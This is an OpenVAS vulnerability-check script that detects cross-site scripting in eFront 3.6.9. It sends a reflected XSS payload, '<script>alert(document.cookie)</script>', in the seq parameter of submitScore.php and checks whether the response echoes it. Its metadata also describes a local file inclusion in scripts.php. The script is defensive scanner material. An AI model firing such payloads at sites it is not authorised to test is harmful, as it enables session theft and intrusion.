##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_efront_xss_n_lfi_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# eFront Cross Site Scripting and Local File Inclusion Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.
  Impact Level: Application.";
tag_affected = "eFront version 3.6.9 Build 11018 and prior";
tag_insight = "Input passed to 'load' parameter in 'scripts.php' and 'seq' parameter in
  'submitScore.php' are not properly sanitised before being returned to the
  user.";
tag_solution = "No solution or patch is available as of 6th July, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.efrontlearning.net/download/download-efront.html";
tag_summary = "This host is running eFront and is prone to cross site scripting
  and local file inclusion vulnerabilities.";

if(description)
{
  script_id(802116);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-07-13 17:31:13 +0200 (Wed, 13 Jul 2011)");
  script_bugtraq_id(47870);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("eFront Cross Site Scripting and Local File Inclusion Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101456/eFront3.6.9build10653-lfi.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101455/eFront3.6.9build10653-XSS.txt");

  script_description(desc);
  script_summary("Check if eFront is vulnerable to Cross Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_efront_detect.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
efPort = get_http_port(default:80);
if(!efPort){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:efPort)){
  exit(0);
}

## Get eFront Location
if(!dir = get_dir_from_kb(port:efPort, app:"eFront")){
  exit(0);
}

if(dir != NULL)
{
  # Try expliot and check response
  sndReq = http_get(item:string(dir, "/www/modules/module_crossword/app/submit" +
                    "Score.php?seq=<script>alert(document.cookie)</script>"), port:efPort);
  rcvRes = http_send_recv(port:efPort, data:sndReq);

  if(":<script>alert(document.cookie)</script>" >< rcvRes){
    security_warning(efPort);
  }
}
